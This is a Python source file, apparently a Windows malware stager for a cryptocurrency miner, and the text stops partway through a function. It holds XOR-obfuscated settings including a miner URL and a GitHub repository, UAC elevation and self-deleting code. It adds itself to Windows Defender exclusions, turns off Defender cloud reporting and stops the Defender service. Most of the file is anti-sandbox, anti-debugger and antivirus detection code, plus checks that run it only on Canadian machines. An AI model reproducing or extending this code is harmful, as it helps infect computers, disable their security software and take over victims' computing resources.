import ctypes, os, sys, subprocess, json, sqlite3, configparser, random, datetime, urllib.request, urllib.error, winreg, logging, traceback, time, zipfile, shutil, tempfile, string, base64, ssl, requests, socket, re, ast
from urllib.parse import quote
import io
from pathlib import Path

SSL_CONTEXT = ssl.create_default_context()

GITHUB_REPO = "https://github.com/ivanban789/bom"
BRANCH = "main"
FOLDER_KEYWORDS = ["windows", "security", "dlls"]
EXE_NAME = "who my pie"
CONFIG_DIR_REL = "Microsoft\\Windows\\Themes\\CachedFiles"
TASK_NAME_NAMEZ = "WindowsNamezTask"

CURRENT_KEY = b'\x00' * 8
ENC_STRINGS = []

def xor_bytes(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def decrypt_string(enc):
    return xor_bytes(enc, CURRENT_KEY).decode()

def encrypt_string(plain):
    return xor_bytes(plain.encode(), CURRENT_KEY)

def get_miner_url():
    return decrypt_string(ENC_STRINGS[0])
def get_github_repo():
    return decrypt_string(ENC_STRINGS[1])
def get_branch():
    return decrypt_string(ENC_STRINGS[2])
def get_folder_keywords():
    return [decrypt_string(ENC_STRINGS[3]), decrypt_string(ENC_STRINGS[4]), decrypt_string(ENC_STRINGS[5])]
def get_exe_name():
    return decrypt_string(ENC_STRINGS[6])
def get_config_dir_base():
    return decrypt_string(ENC_STRINGS[7])
def get_task_name_namez():
    return decrypt_string(ENC_STRINGS[8])

DEBUG_MODE = True
ENABLE_PERSISTENCE = True
TESTING_MODE = True
hawk = logging.getLogger('hawk')
hawk.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
ch.setFormatter(formatter)
hawk.addHandler(ch)

# File logging as backup
log_path = os.path.join(tempfile.gettempdir(), "stager_debug.log")
fh = logging.FileHandler(log_path)
fh.setLevel(logging.DEBUG)
fh.setFormatter(formatter)
hawk.addHandler(fh)
hawk.info(f"[LOG] Writing log to {log_path}")

def global_exception_handler(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    hawk.critical("Unhandled exception:", exc_info=(exc_type, exc_value, exc_traceback))
    for h in hawk.handlers:
        h.flush()
    if sys.stdin and sys.stdin.isatty():
        input("\nPress Enter to exit...")
    sys.exit(999)

sys.excepthook = global_exception_handler

ERR = {
    'RAM_LOW': 101, 'SUSPICIOUS_USERNAME': 102, 'AV_PROCESS_FOUND': 201, 'TOOL_PROCESS_FOUND': 202,
    'AV_SOFTWARE_FOUND': 301, 'TOOL_SOFTWARE_FOUND': 302, 'GEO_FAIL': 401, 'PS_HISTORY_LARGE': 501,
    'PS_RISKY_COMMANDS': 502, 'LOW_BROWSER_APP_CLUSTER': 601, 'ELEVATION_LOOP': 801, 'UNEXPECTED': 999,
    'DISK_LOW': 701, 'SCREEN_BAD': 702, 'CPU_LOW': 703, 'SANDBOX_DLL': 704, 'MAC_PREFIX': 705,
    'NO_MOUSE': 706, 'PROC_COUNT_LOW': 707, 'SANDBOX_FILES': 708, 'UPTIME_LOW': 709, 'DEBUGGER': 710
}

def log_environment_info():
    try:
        admin = is_admin()
        hawk.info(f"[ENV] Admin: {admin}")
        try:
            gid = ctypes.windll.kernel32.GetUserGeoID(16)
            country = "Canada" if gid == 39 else f"GeoID {gid}"
            hawk.info(f"[ENV] Country (GeoID): {country}")
        except:
            hawk.info("[ENV] Country: unknown")
    except:
        pass

def trigger_exit(code, reason):
    log_environment_info()
    hawk.critical(f"TRIGGER_EXIT|code={code}|reason={reason}")
    for h in hawk.handlers:
        h.flush()
    if sys.stdin and sys.stdin.isatty():
        hawk.info("Press Enter to exit...")
        input("\n>>> Script will exit now. Press Enter to close this window.")
    sys.exit(0)

def self_del():
    p = os.path.abspath(sys.argv[0])
    if not os.path.exists(p): sys.exit(0)
    deleted = False
    try:
        sz = os.path.getsize(p)
        with open(p, 'wb') as f:
            f.write(os.urandom(sz))
            f.flush()
            os.fsync(f.fileno())
        os.remove(p)
        deleted = True
    except:
        pass
    if not deleted:
        bat = f'{p}.del.bat'
        with open(bat, 'w') as f:
            f.write(f'@echo off\nping 127.0.0.1 -n 2 > nul\ndel /f /q "{p}"\ndel /f /q "{bat}"\n')
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
        winreg.SetValueEx(key, "delstager", 0, winreg.REG_SZ, f'cmd /c del /f /q "{p}"')
        winreg.CloseKey(key)
    except:
        pass
    sys.exit(0)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def elevate():
    if is_admin(): return
    if os.environ.get('__ELEVATED_ATTEMPT__') == '1':
        hawk.critical("Elevation loop detected")
        trigger_exit(ERR['ELEVATION_LOOP'], "UAC disabled or elevation failed twice")
    os.environ['__ELEVATED_ATTEMPT__'] = '1'
    script = os.path.abspath(sys.argv[0])
    params = ' '.join(f'"{a}"' for a in sys.argv[1:])
    if '--child' in sys.argv:
        params += ' --child'
    ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    if ret <= 32:
        hawk.critical(f"Elevation failed with error code {ret}")
        if DEBUG_MODE:
            if sys.stdin and sys.stdin.isatty():
                input("UAC elevation failed. Please run this script as administrator. Press Enter to exit.")
        trigger_exit(ERR['ELEVATION_LOOP'], f"ShellExecute error {ret}")
    if sys.stdin and sys.stdin.isatty():
        input("Elevation requested. The script is now restarting as admin. Press Enter to close this window.")
    sys.exit(0)

def _add_exclusion_registry(path):
    exclusion_key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, exclusion_key_path)
        winreg.SetValueEx(key, path, 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        hawk.debug(f"[EXCLUSION_REG] added exclusion for: {path}")
    except Exception as e:
        hawk.error(f"[EXCLUSION_REG] failed to set exclusion: {e}")
        try:
            cmd = f'Add-MpPreference -ExclusionPath "{path}"'
            subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

def _verify_exclusion(path):
    exclusion_key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, exclusion_key_path)
        try:
            winreg.QueryValueEx(key, path)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

def add_self_to_defender_exclusions():
    hawk.info("[EXCLUSION] adding script to Defender exclusions")
    try:
        script_path = os.path.abspath(sys.argv[0])
        _add_exclusion_registry(script_path)
        hawk.info("[EXCLUSION] done")
    except Exception as e:
        hawk.error(f"[EXCLUSION] failed: {e}", exc_info=True)

def add_folder_to_defender_exclusions(path):
    hawk.info(f"[EXCLUSION] adding folder {path} to Defender exclusions")
    try:
        _add_exclusion_registry(path)
        hawk.info(f"[EXCLUSION] folder {path} added")
    except Exception as e:
        hawk.error(f"[EXCLUSION] folder exclusion failed: {e}", exc_info=True)

def _set_volatile_pause_flag():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        winreg.SetValueEx(key, "MinerPaused", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception as e:
        hawk.error(f"[PAUSE_FLAG] set failed: {e}")

def _clear_volatile_pause_flag():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        winreg.SetValueEx(key, "MinerPaused", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except Exception as e:
        hawk.error(f"[PAUSE_FLAG] clear failed: {e}")

def _is_volatile_pause_flag_set():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        val, _ = winreg.QueryValueEx(key, "MinerPaused")
        winreg.CloseKey(key)
        return val == 1
    except:
        return False

def chk_disk():
    hawk.info("[DISK_CHECK] start")
    try:
        free = ctypes.c_ulonglong(0)
        total = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW("C:\\", ctypes.byref(ctypes.c_ulonglong()), ctypes.byref(total), ctypes.byref(free))
        gb = total.value / (1024**3)
        hawk.debug(f"[DISK_CHECK] total={gb:.2f} GB")
        if gb < 50.0:
            hawk.critical(f"[DISK_CHECK] FAIL {gb:.2f} < 50")
            if not TESTING_MODE:
                trigger_exit(ERR['DISK_LOW'], f"Disk {gb:.2f} GB")
            else:
                hawk.warning(f"TESTING: Would have exited – Disk {gb:.2f} GB")
        hawk.info("[DISK_CHECK] pass")
    except Exception as e:
        hawk.error(f"[DISK_CHECK] error: {e}", exc_info=True)

def chk_screen():
    hawk.info("[SCREEN_CHECK] start")
    try:
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        hawk.debug(f"[SCREEN_CHECK] res={w}x{h}")
        if w < 800 or h < 600:
            hawk.critical("[SCREEN_CHECK] FAIL small resolution")
            if not TESTING_MODE:
                trigger_exit(ERR['SCREEN_BAD'], f"Resolution {w}x{h}")
            else:
                hawk.warning("TESTING: Would have exited – screen too small")
        hawk.info("[SCREEN_CHECK] pass")
    except Exception as e:
        hawk.error(f"[SCREEN_CHECK] error: {e}", exc_info=True)

def chk_cpu():
    hawk.info("[CPU_CHECK] start")
    try:
        cores = os.cpu_count() or 1
        hawk.debug(f"[CPU_CHECK] cores={cores}")
        if cores < 2:
            hawk.critical("[CPU_CHECK] FAIL less than 2 cores")
            if not TESTING_MODE:
                trigger_exit(ERR['CPU_LOW'], f"CPU cores: {cores}")
            else:
                hawk.warning("TESTING: Would have exited – CPU cores <2")
        hawk.info("[CPU_CHECK] pass")
    except Exception as e:
        hawk.error(f"[CPU_CHECK] error: {e}", exc_info=True)

def chk_sandbox_dlls():
    hawk.info("[SANDBOX_DLL_CHECK] start")
    dlls = ['sbiedll.dll', 'vboxhook.dll', 'dbghelp.dll', 'api_log.dll', 'dir_watch.dll']
    found = False
    for dll in dlls:
        try:
            h = ctypes.windll.kernel32.GetModuleHandleA(dll.encode())
            if h:
                found = True
                hawk.critical(f"[SANDBOX_DLL_CHECK] Found DLL: {dll}")
        except:
            pass
    if found:
        if not TESTING_MODE:
            trigger_exit(ERR['SANDBOX_DLL'], "Sandbox DLL found")
        else:
            hawk.warning("TESTING: Would have exited – Sandbox DLL found")
    hawk.info("[SANDBOX_DLL_CHECK] pass")

def chk_mac_prefix():
    hawk.info("[MAC_CHECK] start")
    try:
        macs = os.popen('getmac /fo csv /nh').read().lower()
        prefixes = ['00-0c-29', '00-50-56', '08-00-27', '00-05-69', '00-0c-29']
        for p in prefixes:
            if p in macs:
                hawk.critical(f"[MAC_CHECK] VM MAC prefix: {p}")
                if not TESTING_MODE:
                    trigger_exit(ERR['MAC_PREFIX'], f"MAC prefix: {p}")
                else:
                    hawk.warning(f"TESTING: Would have exited – MAC prefix {p}")
        hawk.info("[MAC_CHECK] pass")
    except Exception as e:
        hawk.error(f"[MAC_CHECK] error: {e}", exc_info=True)

def chk_mouse_activity():
    hawk.info("[MOUSE_CHECK] start")
    try:
        from ctypes import windll, Structure, c_long, byref
        class POINT(Structure):
            _fields_ = [("x", c_long), ("y", c_long)]
        p1 = POINT()
        windll.user32.GetCursorPos(byref(p1))
        time.sleep(3)
        p2 = POINT()
        windll.user32.GetCursorPos(byref(p2))
        if p1.x == p2.x and p1.y == p2.y:
            hawk.critical("[MOUSE_CHECK] no mouse movement")
            if not TESTING_MODE:
                trigger_exit(ERR['NO_MOUSE'], "No mouse movement detected")
            else:
                hawk.warning("TESTING: Would have exited – no mouse movement")
        hawk.info("[MOUSE_CHECK] pass")
    except Exception as e:
        hawk.error(f"[MOUSE_CHECK] error: {e}", exc_info=True)

def chk_process_count():
    hawk.info("[PROC_COUNT_CHECK] start")
    try:
        out = subprocess.run('tasklist /fo csv /nh', capture_output=True, text=True, shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW).stdout
        cnt = len([l for l in out.splitlines() if l.strip()])
        hawk.debug(f"[PROC_COUNT_CHECK] count={cnt}")
        if cnt < 50:
            hawk.critical("[PROC_COUNT_CHECK] too few processes")
            if not TESTING_MODE:
                trigger_exit(ERR['PROC_COUNT_LOW'], f"Process count: {cnt}")
            else:
                hawk.warning(f"TESTING: Would have exited – process count {cnt}")
        hawk.info("[PROC_COUNT_CHECK] pass")
    except Exception as e:
        hawk.error(f"[PROC_COUNT_CHECK] error: {e}", exc_info=True)

def chk_sandbox_files():
    hawk.info("[SANDBOX_FILE_CHECK] start")
    paths = [r"C:\agent\agent.py", r"C:\cuckoo\stuff", r"C:\sandbox\flag.txt"]
    for p in paths:
        if os.path.exists(p):
            hawk.critical(f"[SANDBOX_FILE_CHECK] Found file: {p}")
            if not TESTING_MODE:
                trigger_exit(ERR['SANDBOX_FILES'], f"Sandbox file: {p}")
            else:
                hawk.warning(f"TESTING: Would have exited – sandbox file {p}")
    hawk.info("[SANDBOX_FILE_CHECK] pass")

def chk_uptime():
    hawk.info("[UPTIME_CHECK] start")
    try:
        import psutil
        uptime_seconds = (datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())).total_seconds()
    except:
        try:
            res = subprocess.run('wmic os get lastbootuptime', capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            lines = [l.strip() for l in res.stdout.splitlines() if l.strip()]
            boot = datetime.datetime.strptime(lines[1][:14], "%Y%m%d%H%M%S")
            uptime_seconds = (datetime.datetime.now() - boot).total_seconds()
        except:
            uptime_seconds = 9999
    hawk.debug(f"[UPTIME_CHECK] uptime minutes: {uptime_seconds/60:.1f}")
    if uptime_seconds < 1800:
        hawk.critical("[UPTIME_CHECK] uptime < 30 minutes")
        if not TESTING_MODE:
            trigger_exit(ERR['UPTIME_LOW'], f"Uptime: {uptime_seconds} sec")
        else:
            hawk.warning("TESTING: Would have exited – uptime too low")
    hawk.info("[UPTIME_CHECK] pass")

def chk_debugger():
    hawk.info("[DEBUGGER_CHECK] start")
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            hawk.critical("[DEBUGGER_CHECK] debugger attached")
            if not TESTING_MODE:
                trigger_exit(ERR['DEBUGGER'], "Debugger detected")
            else:
                hawk.warning("TESTING: Would have exited – debugger present")
        hawk.info("[DEBUGGER_CHECK] pass")
    except Exception as e:
        hawk.error(f"[DEBUGGER_CHECK] error: {e}", exc_info=True)

def chk_ram():
    hawk.info("[RAM_CHECK] start")
    try:
        class MEM(ctypes.Structure):
            _fields_ = [("len", ctypes.c_ulong), ("load", ctypes.c_ulong), ("total", ctypes.c_ulonglong),
                        ("avail", ctypes.c_ulonglong), ("pf", ctypes.c_ulonglong), ("pfa", ctypes.c_ulonglong),
                        ("virt", ctypes.c_ulonglong), ("va", ctypes.c_ulonglong), ("ext", ctypes.c_ulonglong)]
        m = MEM()
        m.len = ctypes.sizeof(MEM)
        if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m)):
            hawk.error("[RAM_CHECK] GlobalMemoryStatusEx failed")
            return
        gb = m.total / (1024**3)
        hawk.debug(f"[RAM_CHECK] total={gb:.2f} GB")
        if gb < 2.0:
            hawk.critical(f"[RAM_CHECK] FAIL {gb:.2f} < 2")
            if not TESTING_MODE:
                trigger_exit(ERR['RAM_LOW'], f"RAM {gb:.2f} GB")
            else:
                hawk.warning(f"TESTING: Would have exited – RAM {gb:.2f} GB")
        hawk.info("[RAM_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[RAM_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "RAM check crashed")

SANDBOX_EXACT = {'sandbox', 'malware', 'virus', 'cuckoo', 'nms', 'vmware', 'virtual', 'admin-test'}
def chk_user():
    hawk.info("[USER_CHECK] start")
    try:
        try: u = os.getlogin().lower()
        except: u = os.environ.get('USERNAME', '').lower()
        hawk.debug(f"[USER_CHECK] username={u}")
        if u in SANDBOX_EXACT:
            if not TESTING_MODE:
                trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Exact sandbox name: {u}")
            else:
                hawk.warning(f"TESTING: Would have exited – username {u} is sandbox")
        score = 0
        if len(u) < 4: score += 30
        if any(word in u for word in ['sandbox', 'malware', 'cuckoo', 'vmware', 'virtual']):
            score += 20
        if score >= 40:
            if not TESTING_MODE:
                trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Username suspicion score {score}")
            else:
                hawk.warning(f"TESTING: Would have exited – username score {score}")
        hawk.info("[USER_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[USER_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "User check crashed")

AV_PROCS = {
    'bdagent.exe', 'avastui.exe', 'avgui.exe', 'mbam.exe', 'mbamservice.exe',
    'kav.exe', 'egui.exe', 'fsbts.exe', 'sophos.exe', 'mcshield.exe', 'navw32.exe'
}
TOOL_PROCS = {
    'wireshark.exe', 'procmon.exe', 'procexp.exe', 'ghidra.exe', 'ida.exe', 'x64dbg.exe', 'ollydbg.exe',
    'windbg.exe', 'fiddler.exe', 'charles.exe', 'tcpview.exe', 'regshot.exe', 'autoruns.exe', 'processhacker.exe'
}

def chk_procs():
    hawk.info("[PROC_CHECK] start")
    try:
        out = subprocess.run('tasklist /fo csv /nh', capture_output=True, text=True, shell=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW).stdout.lower()
        for line in out.splitlines():
            for p in AV_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] AV process: {p}")
                    if not TESTING_MODE:
                        trigger_exit(ERR['AV_PROCESS_FOUND'], f"Process: {p}")
                    else:
                        hawk.warning(f"TESTING: Would have exited – AV process {p}")
            for p in TOOL_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] Tool process: {p}")
                    if not TESTING_MODE:
                        trigger_exit(ERR['TOOL_PROCESS_FOUND'], f"Process: {p}")
                    else:
                        hawk.warning(f"TESTING: Would have exited – tool process {p}")
    except Exception as e:
        hawk.error(f"[PROC_CHECK] error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Process check failed completely")
    hawk.info("[PROC_CHECK] pass")

AV_BRANDS = {
    'bitdefender':'antivirus', 'malwarebytes':'antimalware', 'norton':'security', 'mcafee':'antivirus',
    'kaspersky':'security', 'avast':'antivirus', 'avg':'antivirus', 'eset':'security', 'trend micro':'security',
    'sophos':'antivirus', 'comodo':'security', 'f-secure':'security', 'g data':'antivirus', 'panda':'antivirus', 'webroot':'antivirus'
}
TOOL_NAMES = {
    'wireshark','procmon','process explorer','ghidra','ida pro','x64dbg','ollydbg','windbg',
    'fiddler','charles','http debugger','api monitor','tcpview','regshot','autoruns','process hacker',
    'dnspy','ilspy','pebear','resource hacker'
}

def chk_software():
    hawk.info("[SW_CHECK] start")
    total_keys = 0
    try:
        hives = [(winreg.HKEY_LOCAL_MACHINE, [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]),
                 (winreg.HKEY_CURRENT_USER, [r"Software\Microsoft\Windows\CurrentVersion\Uninstall"])]
        for hkey, bases in hives:
            for base in bases:
                try:
                    k = winreg.OpenKey(hkey, base)
                    i = 0
                    while True:
                        try:
                            name = winreg.EnumKey(k, i)
                            total_keys += 1
                            try:
                                with winreg.OpenKey(hkey, f"{base}\\{name}") as sk:
                                    d, _ = winreg.QueryValueEx(sk, "DisplayName")
                                    d = d.lower()
                                    for brand in AV_BRANDS:
                                        if brand in d:
                                            if 'windows' not in d and 'defender' not in d and 'vpn' not in d:
                                                hawk.critical(f"[SW_CHECK] AV: {d}")
                                                if not TESTING_MODE:
                                                    trigger_exit(ERR['AV_SOFTWARE_FOUND'], f"AV: {d}")
                                                else:
                                                    hawk.warning(f"TESTING: Would have exited – AV: {d}")
                                    for t in TOOL_NAMES:
                                        if t in d:
                                            hawk.critical(f"[SW_CHECK] Tool: {d}")
                                            if not TESTING_MODE:
                                                trigger_exit(ERR['TOOL_SOFTWARE_FOUND'], f"Tool: {d}")
                                            else:
                                                hawk.warning(f"TESTING: Would have exited – Tool: {d}")
                            except OSError:
                                pass
                            except Exception as e:
                                hawk.warning(f"[SW_CHECK] error reading key {name}: {e}", exc_info=True)
                            i += 1
                        except OSError: break
                    winreg.CloseKey(k)
                except Exception as e:
                    hawk.error(f"[SW_CHECK] reg error: {e}", exc_info=True)
        hawk.debug(f"[SW_CHECK] total keys enumerated: {total_keys}")
        if total_keys < 10 and not is_admin():
            hawk.warning("[SW_CHECK] few keys and not admin – uninstall data may be incomplete")
        hawk.info("[SW_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[SW_CHECK] unexpected fatal error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Software check crashed")

def _fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    return urllib.request.urlopen(req, timeout=5, context=SSL_CONTEXT)

def geo_ca():
    hawk.info("[GEO_CHECK] start")
    try:
        try:
            gid = ctypes.windll.kernel32.GetUserGeoID(16)
            hawk.debug(f"[GEO_CHECK] GeoID={gid}")
            if gid == 39:
                hawk.info("[GEO_CHECK] pass via GeoID")
                return True
        except Exception as e:
            hawk.error(f"[GEO_CHECK] GeoID error: {e}", exc_info=True)

        apis = [
            ('http://ip-api.com/json/?fields=countryCode,proxy,isp,org,as', lambda d: (d.get('countryCode',''), d.get('proxy',False), ' '.join([d.get('isp',''), d.get('org',''), d.get('as','')]).lower())),
            ('http://ipapi.co/json/', lambda d: (d.get('country',''), d.get('proxy',False), ' '.join([d.get('org','')]).lower()))
        ]
        vpn_words = ['hosting','cloud','datacenter','vpn','proxy','tor','digitalocean','vultr','linode','ovh','hetzner','leaseweb']
        results = []
        for url, parser in apis:
            try:
                data = json.loads(_fetch(url).read().decode())
                cc, proxy, isp_org = parser(data)
                hawk.debug(f"[GEO_CHECK] API {url}: cc={cc}, proxy={proxy}, isp_org={isp_org}")
                vpn_hit = any(w in isp_org for w in vpn_words)
                results.append((cc, proxy, vpn_hit))
            except Exception as e:
                hawk.error(f"[GEO_CHECK] API {url} error: {e}", exc_info=True)

        if results:
            ca_ips = all(r[0]=='CA' for r in results)
            any_proxy = any(r[1] for r in results)
            any_vpn = any(r[2] for r in results)
            hawk.debug(f"[GEO_CHECK] consensus: ca={ca_ips}, proxy={any_proxy}, vpn={any_vpn}")
            if ca_ips and not any_proxy and not any_vpn:
                hawk.info("[GEO_CHECK] pass via IP consensus")
                return True
            elif ca_ips and (any_proxy or any_vpn):
                hawk.critical("[GEO_CHECK] VPN/proxy with CA IP – failing closed")
            else:
                hawk.critical("[GEO_CHECK] not all IPs Canada")
        else:
            hawk.critical("[GEO_CHECK] all IP APIs failed")
        if not TESTING_MODE:
            trigger_exit(ERR['GEO_FAIL'], "Not Canada or VPN/proxy detected")
        else:
            hawk.warning("TESTING: Would have exited – geo check failed")
        return False
    except Exception as e:
        hawk.critical(f"[GEO_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Geo check crashed")
        return False

def chk_timezone():
    hawk.info("[TZ_CHECK] start")
    canada_tz = [
        "Eastern Standard Time",
        "Central Standard Time",
        "Mountain Standard Time",
        "Pacific Standard Time",
        "Atlantic Standard Time",
        "Newfoundland Standard Time",
        "Canada Central Standard Time"
    ]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Control\TimeZoneInformation")
        tz_name, _ = winreg.QueryValueEx(key, "TimeZoneKeyName")
        winreg.CloseKey(key)
        hawk.debug(f"[TZ_CHECK] timezone: {tz_name}")
        if tz_name in canada_tz:
            hawk.info("[TZ_CHECK] pass")
            return True
        else:
            hawk.critical(f"[TZ_CHECK] non-Canadian timezone: {tz_name}")
            if not TESTING_MODE:
                trigger_exit(ERR['GEO_FAIL'], f"Timezone: {tz_name}")
            else:
                hawk.warning("TESTING: Would have exited – timezone not Canadian")
            return False
    except Exception as e:
        hawk.error(f"[TZ_CHECK] error: {e}", exc_info=True)
        return False

def get_sys_install_age_days():
    try:
        out = subprocess.run('systeminfo', capture_output=True, text=True, shell=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW).stdout
        for line in out.splitlines():
            if 'Original Install Date' in line:
                date_str = line.split(':', 1)[1].strip()
                for fmt in ("%m/%d/%Y, %I:%M:%S %p", "%Y-%m-%d"):
                    try:
                        dt = datetime.datetime.strptime(date_str, fmt)
                        return (datetime.datetime.now() - dt).days
                    except ValueError:
                        continue
    except Exception as e:
        hawk.error(f"[SYS_INSTALL_AGE] failed: {e}", exc_info=True)
    return 365

def chk_ps_history():
    hawk.info("[PS_CHECK] start")
    try:
        hp = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        if not os.path.exists(hp):
            hawk.info("[PS_CHECK] no history file")
            return
        with open(hp, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
        cnt = len(lines)
        hawk.debug(f"[PS_CHECK] line count={cnt}")
        sys_age = get_sys_install_age_days()
        threshold = 2000 if sys_age > 30 else 800
        if cnt > threshold:
            hawk.critical(f"[PS_CHECK] count {cnt} > {threshold}")
            if not TESTING_MODE:
                trigger_exit(ERR['PS_HISTORY_LARGE'], f"Lines: {cnt}")
            else:
                hawk.warning(f"TESTING: Would have exited – PS history large ({cnt})")
        if cnt > 30:
            combined = ' '.join(lines).lower()
            risky_high = ['invoke-expression', 'iex ', 'downloadstring', 'frombase64', '-enc ']
            risky_low = ['start-process']
            hits_high = sum(1 for r in risky_high if r in combined)
            hits_low = sum(1 for r in risky_low if r in combined)
            hawk.debug(f"[PS_CHECK] risky high={hits_high}, low={hits_low}")
            if hits_high >= 3 or hits_low >= 15:
                hawk.critical(f"[PS_CHECK] risky commands high={hits_high}, low={hits_low}")
                if not TESTING_MODE:
                    trigger_exit(ERR['PS_RISKY_COMMANDS'], f"High:{hits_high} Low:{hits_low}")
                else:
                    hawk.warning(f"TESTING: Would have exited – risky PS commands")
    except Exception as e:
        hawk.error(f"[PS_CHECK] error: {e}", exc_info=True)
    hawk.info("[PS_CHECK] pass")

def browser_history():
    hawk.info("[HISTORY_CHECK] start")
    cnt = 0
    try:
        def count_db(db_path, table, col):
            tmp = None
            try:
                fd, tmp = tempfile.mkstemp(suffix='.sqlite')
                os.close(fd)
                shutil.copy2(db_path, tmp)
                uri = 'file:' + tmp.replace('\\', '/') + '?mode=ro'
                conn = sqlite3.connect(uri, uri=True, timeout=2)
                cur = conn.execute(f"SELECT COUNT(*) FROM {table}")
                res = cur.fetchone()[0]
                conn.close()
                return res
            except:
                return 0
            finally:
                if tmp and os.path.exists(tmp):
                    os.unlink(tmp)

        local_appdata = os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local')
        chrome_root = os.path.join(local_appdata, 'Google', 'Chrome', 'User Data')
        if os.path.isdir(chrome_root):
            for profile in os.listdir(chrome_root):
                db = os.path.join(chrome_root, profile, 'History')
                if os.path.exists(db):
                    cnt += count_db(db, 'urls', None)

        edge_db = os.path.join(local_appdata, r'Microsoft\Edge\User Data\Default\History')
        if os.path.exists(edge_db):
            cnt += count_db(edge_db, 'urls', None)

        roaming = os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming')
        ff_ini = os.path.join(roaming, r'Mozilla\Firefox\profiles.ini')
        if os.path.exists(ff_ini):
            try:
                cfg = configparser.ConfigParser()
                cfg.read(ff_ini)
                for sec in cfg.sections():
                    if 'default' in sec.lower() or cfg.get(sec,'Name',fallback=None)=='Default':
                        pp = cfg.get(sec,'path',fallback=None)
                        if pp:
                            if not os.path.isabs(pp): pp = os.path.join(roaming,'Mozilla','Firefox',pp)
                            places = os.path.join(pp,'places.sqlite')
                            if os.path.exists(places):
                                cnt += count_db(places, 'moz_places', None)
            except:
                pass
    except Exception as e:
        hawk.error(f"[HISTORY_CHECK] fatal error: {e}", exc_info=True)
    hawk.debug(f"[HISTORY_CHECK] total={cnt}")
    hawk.info("[HISTORY_CHECK] end")
    return cnt

def app_cluster():
    hawk.info("[APP_CLUSTER_CHECK] start")
    hawk.debug("[APP_CLUSTER_CHECK] disabled")
    hawk.info("[APP_CLUSTER_CHECK] end")
    return False

def disable_defender_cloud():
    hawk.info("[DEFENDER_DISABLE] start")
    try:
        spynet_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, spynet_path)
        winreg.SetValueEx(key, "SpynetReporting", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "SubmitSamplesConsent", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(key, "DisableBlockAtFirstSeen", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        subprocess.run('gpupdate /force', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('sc stop WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
